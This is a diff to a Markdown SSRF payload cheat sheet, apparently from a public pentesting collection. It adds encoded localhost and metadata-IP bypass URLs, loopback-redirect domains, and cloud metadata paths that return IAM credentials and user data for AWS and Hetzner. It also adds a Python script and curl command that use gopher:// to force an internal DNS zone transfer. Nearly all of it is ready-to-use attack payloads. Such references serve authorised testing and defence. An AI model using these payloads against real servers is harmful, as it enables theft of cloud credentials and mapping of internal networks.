@@ -36,6 +36,7 @@
 * [SSRF exploiting Redis](#ssrf-exploiting-redis)
 * [SSRF exploiting PDF file](#ssrf-exploiting-pdf-file)
 * [Blind SSRF](#blind-ssrf)
+* [SSRF to AXFR DNS](#ssrf-to-axfr-dns)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF from XSS](#ssrf-from-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
@@ -52,15 +53,18 @@
   * [SSRF URL for Oracle Cloud](#ssrf-url-for-oracle-cloud)
   * [SSRF URL for Kubernetes ETCD](#ssrf-url-for-kubernetes-etcd)
   * [SSRF URL for Alibaba](#ssrf-url-for-alibaba)
+  * [SSRF URL for Hetzner Cloud](#ssrf-url-for-hetzner-cloud)
   * [SSRF URL for Docker](#ssrf-url-for-docker)
   * [SSRF URL for Rancher](#ssrf-url-for-rancher)
 
 ## Tools
 
-- [SSRFmap - https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)
-- [Gopherus - https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)
-- [See-SURF - https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)
-- [SSRF Sheriff - https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)
+- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Automatic SSRF fuzzer and exploitation tool
+- [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Generates gopher link for exploiting SSRF and gaining RCE in various servers
+- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Python based scanner to find potential SSRF parameters
+- [teknogeek/SSRF Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Simple SSRF-testing sheriff written in Go
+* [assetnote/surf](https://github.com/assetnote/surf) - Returns a list of viable SSRF candidates
+* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.
 
 ## Payloads with localhost
 
@@ -102,19 +106,21 @@ http://[::]:3128/ Squid
 ```
 
 ```powershell
-http://0000::1:80/
-http://0000::1:25/ SMTP
-http://0000::1:22/ SSH
-http://0000::1:3128/ Squid
+http://[0000::1]:80/
+http://[0000::1]:25/ SMTP
+http://[0000::1]:22/ SSH
+http://[0000::1]:3128/ Squid
 ```
 
 ### Bypass localhost with a domain redirection
 
-
-* `spoofed.[BURP_COLLABORATOR]` such as `spoofed.redacted.oastify.com`
-* `localtest.me` redirect to `::1`
-* `company.127.0.0.1.nip.io` redirect to `127.0.0.1`
-* `bugbounty.dod.network` redirect to `127.0.0.2`
+| Domain                       | Redirect to |
+|------------------------------|-------------|
+| localtest.me                 | `::1`       |
+| localh.st                    | `127.0.0.1` |
+| spoofed.[BURP_COLLABORATOR]  | `127.0.0.1` |
+| spoofed.redacted.oastify.com | `127.0.0.1` |
+| company.127.0.0.1.nip.io     | `127.0.0.1` |
 
 The service nip.io is awesome for that, it will convert any ip address as a dns.
 
@@ -138,7 +144,7 @@ http://127.0.0.0
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
-http://2852039166/  = http://169.254.169.254
+http://2852039166/ = http://169.254.169.254
 ```
 
 ### Bypass using octal IP
@@ -164,6 +170,7 @@ Ref:
 
 ```powershell
 http://[0:0:0:0:0:ffff:127.0.0.1]
+http://[::ffff:127.0.0.1]
 ```
 
 ### Bypass using malformed urls
@@ -509,6 +516,36 @@ From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.co
 - [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)
 
 
+## SSRF to AXFR DNS
+
+Query an internal DNS resolver to trigger a full zone transfer (AXFR) and exfiltrate a list of subdomains.
+
+```py
+from urllib.parse import quote
+domain,tld = "example.lab".split('.')
+dns_request =  b"\x01\x03\x03\x07"    # BITMAP
+dns_request += b"\x00\x01"            # QCOUNT
+dns_request += b"\x00\x00"            # ANCOUNT
+dns_request += b"\x00\x00"            # NSCOUNT
+dns_request += b"\x00\x00"            # ARCOUNT
+dns_request += len(domain).to_bytes() # LEN DOMAIN
+dns_request += domain.encode()        # DOMAIN
+dns_request += len(tld).to_bytes()    # LEN TLD
+dns_request += tld.encode()           # TLD
+dns_request += b"\x00"                # DNAME EOF
+dns_request += b"\x00\xFC"            # QTYPE AXFR (252)
+dns_request += b"\x00\x01"            # QCLASS IN (1)
+dns_request = len(dns_request).to_bytes(2, byteorder="big") + dns_request
+print(f'gopher://127.0.0.1:25/_{quote(dns_request)}')
+```
+
+Example of payload for `example.lab`: `gopher://127.0.0.1:25/_%00%1D%01%03%03%07%00%01%00%00%00%00%00%00%07example%03lab%00%00%FC%00%01`
+
+```ps1
+curl -s -i -X POST -d 'url=gopher://127.0.0.1:53/_%2500%251d%25a9%25c1%2500%2520%2500%2501%2500%2500%2500%2500%2500%2500%2507%2565%2578%2561%256d%2570%256c%2565%2503%256c%2561%2562%2500%2500%25fc%2500%2501' http://localhost:5000/ssrf --output - | xxd
+```
+
+
 ## SSRF to XSS 
 
 by [@D0rkerDevil & @alyssa.o.herrera](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
@@ -541,76 +578,83 @@ Example of a PDF attachment using HTML
 
 ## SSRF URL for Cloud Instances
 
-### SSRF URL for AWS Bucket
+### SSRF URL for AWS
 
-[Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
-Interesting path to look for at `http://169.254.169.254` or `http://instance-data`
+The AWS Instance Metadata Service is a service available within Amazon EC2 instances that allows those instances to access metadata about themselves. - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
 
+
+* IPv4 endpoint (old): `http://169.254.169.254/latest/meta-data/`
+* IPv4 endpoint (new) requires the header `X-aws-ec2-metadata-token`
+  ```powershell
+  export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "http://169.254.169.254/latest/api/token"`
+  curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "http://169.254.169.254/latest/meta-data"
+  ```
+
+* IPv6 endpoint: `http://[fd00:ec2::254]/latest/meta-data/` 
+
+In case of a WAF, you might want to try different ways to connect to the API.
+
+* DNS record pointing to the AWS API IP
+  ```powershell
+  http://instance-data
+  http://169.254.169.254
+  http://169.254.169.254.nip.io/
+  ```
+* HTTP redirect
+  ```powershell
+  Static:http://nicob.net/redir6a
+  Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
+  ```
+* Encoding the IP to bypass WAF
+  ```powershell
+  http://425.510.425.510 Dotted decimal with overflow
+  http://2852039166 Dotless decimal
+  http://7147006462 Dotless decimal with overflow
+  http://0xA9.0xFE.0xA9.0xFE Dotted hexadecimal
+  http://0xA9FEA9FE Dotless hexadecimal
+  http://0x41414141A9FEA9FE Dotless hexadecimal with overflow
+  http://0251.0376.0251.0376 Dotted octal
+  http://0251.00376.000251.0000376 Dotted octal with padding
+  http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
+  http://[::ffff:a9fe:a9fe] IPV6 Compressed
+  http://[0:0:0:0:0:ffff:a9fe:a9fe] IPV6 Expanded
+  http://[0:0:0:0:0:ffff:169.254.169.254] IPV6/IPV4
+  http://[fd00:ec2::254] IPV6
+  ```
+
+
+These URLs return a list of IAM roles associated with the instance. You can then append the role name to this URL to retrieve the security credentials for the role.
 ```powershell
-Always here : /latest/meta-data/{hostname,public-ipv4,...}
-User data (startup script for auto-scaling) : /latest/user-data
-Temporary AWS credentials : /latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+
+# Examples
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 ```
 
-DNS record
-
-```powershell
-http://instance-data
-http://169.254.169.254
-http://169.254.169.254.nip.io/
-```
-
-HTTP redirect
-
-```powershell
-Static:http://nicob.net/redir6a
-Dynamic:http://nicob.net/redir-http-169.254.169.254:80-
-```
-
-Alternate IP encoding
-
-```powershell
-http://425.510.425.510/ Dotted decimal with overflow
-http://2852039166/ Dotless decimal
-http://7147006462/ Dotless decimal with overflow
-http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
-http://0xA9FEA9FE/ Dotless hexadecimal
-http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
-http://0251.0376.0251.0376/ Dotted octal
-http://0251.00376.000251.0000376/ Dotted octal with padding
-http://0251.254.169.254 Mixed encoding (dotted octal + dotted decimal)
-```
-
-More urls to include
-
+This URL is used to access the user data that was specified when launching the instance. User data is often used to pass startup scripts or other configuration information into the instance.
 ```powershell
 http://169.254.169.254/latest/user-data
-http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+```
+
+Other URLs to query to access various pieces of metadata about the instance, like the hostname, public IPv4 address, and other properties.
+```powershell
 http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
-http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
 http://169.254.169.254/latest/meta-data/ami-id
 http://169.254.169.254/latest/meta-data/reservation-id
 http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/public-keys/
 http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
-http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
-http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
 http://169.254.169.254/latest/dynamic/instance-identity/document
-```
-
-AWS SSRF Bypasses
-```
-Converted Decimal IP: http://2852039166/latest/meta-data/
-IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
-IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
-IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
 ```
 
 E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
 
 E.g2: Flaws challenge - `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/`
+
 
 ### SSRF URL for AWS ECS
 
@@ -794,6 +838,18 @@ http://100.100.100.200/latest/meta-data/instance-id
 http://100.100.100.200/latest/meta-data/image-id
 ```
 
+### SSRF URL for Hetzner Cloud
+
+```powershell
+http://169.254.169.254/hetzner/v1/metadata
+http://169.254.169.254/hetzner/v1/metadata/hostname
+http://169.254.169.254/hetzner/v1/metadata/instance-id
+http://169.254.169.254/hetzner/v1/metadata/public-ipv4
+http://169.254.169.254/hetzner/v1/metadata/private-networks
+http://169.254.169.254/hetzner/v1/metadata/availability-zone
+http://169.254.169.254/hetzner/v1/metadata/region
+```
+
 ### SSRF URL for Kubernetes ETCD
 
 Can contain API keys and internal ip and ports
@@ -871,3 +927,6 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
 - [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
 - [SSRF: Don't encode entire IP](https://twitter.com/thedawgyg/status/1224547692967342080)
+- [Pong [EN]| FCSC 2024 - vozec - April 12, 2024](https://vozec.fr/writeups/pong-fcsc2024-en/)
+- [Pong [EN]| FCSC 2024 - mizu.re - Apr 13, 2024](https://mizu.re/post/pong)
+- [SSRFmap - Introducing the AXFR module - Swissky - June 13, 2024](https://swisskyrepo.github.io/SSRFmap-axfr/)
